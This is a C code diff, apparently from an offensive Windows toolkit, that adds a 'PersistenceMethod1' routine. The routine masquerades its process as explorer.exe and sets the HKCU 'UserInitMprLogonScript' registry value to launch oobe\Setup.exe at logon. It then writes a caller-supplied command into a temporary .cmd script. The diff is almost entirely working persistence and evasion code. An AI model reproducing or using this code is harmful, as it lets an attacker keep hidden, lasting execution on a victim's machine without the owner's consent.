@@ -198,7 +198,7 @@ BOOL SetupScriptMethod
 	cbCmdContent = lstrlenA(lpCommandLine) + lstrlenA("@echo off\n");
 	pCmdContent = ALLOC(cbCmdContent + 1);
 	sprintf_s(pCmdContent, cbCmdContent + 1, "@echo off\n%s", lpCommandLine);
-	if (!WriteToTempPath(pCmdContent, cbCmdContent, L".cmd", &lpCmdPath)) {
+	if (!WriteToTempPath(pCmdContent, cbCmdContent, L"cmd", &lpCmdPath)) {
 		goto CLEANUP;
 	}
 
@@ -219,5 +219,40 @@ CLEANUP:
 		FREE(lpCmdPath);
 	}
 
+	return Result;
+}
+
+BOOL PersistenceMethod1
+(
+	_In_ LPSTR lpCommandLine
+)
+{
+	LSTATUS Status = STATUS_SUCCESS;
+	BOOL Result = FALSE;
+	WCHAR wszSetupPath[MAX_PATH];
+	WCHAR wszExplorerPath[MAX_PATH];
+	LPWSTR BackupPath[5];
+
+	RtlSecureZeroMemory(wszExplorerPath, sizeof(wszExplorerPath));
+	GetWindowsDirectoryW(wszExplorerPath, _countof(wszExplorerPath));
+	lstrcatW(wszExplorerPath, L"\\explorer.exe");
+	RtlSecureZeroMemory(BackupPath, sizeof(BackupPath));
+	MasqueradeProcessPath(wszExplorerPath, FALSE, BackupPath);
+	RtlSecureZeroMemory(wszSetupPath, sizeof(wszSetupPath));
+	GetSystemDirectoryW(wszSetupPath, _countof(wszSetupPath));
+	lstrcatW(wszSetupPath, L"\\oobe\\Setup.exe");
+	Status = RegSetKeyValueW(HKEY_CURRENT_USER, L"Environment", L"UserInitMprLogonScript", REG_SZ, wszSetupPath, (lstrlenW(wszSetupPath) + 1) * sizeof(WCHAR));
+	if (!NT_SUCCESS(Status)) {
+		LogError(L"RegSetKeyValueW failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, Status);
+		goto CLEANUP;
+	}
+
+	if (!SetupScriptMethod(lpCommandLine)) {
+		goto CLEANUP;
+	}
+
+	Result = TRUE;
+CLEANUP:
+	MasqueradeProcessPath(NULL, TRUE, BackupPath);
 	return Result;
 }
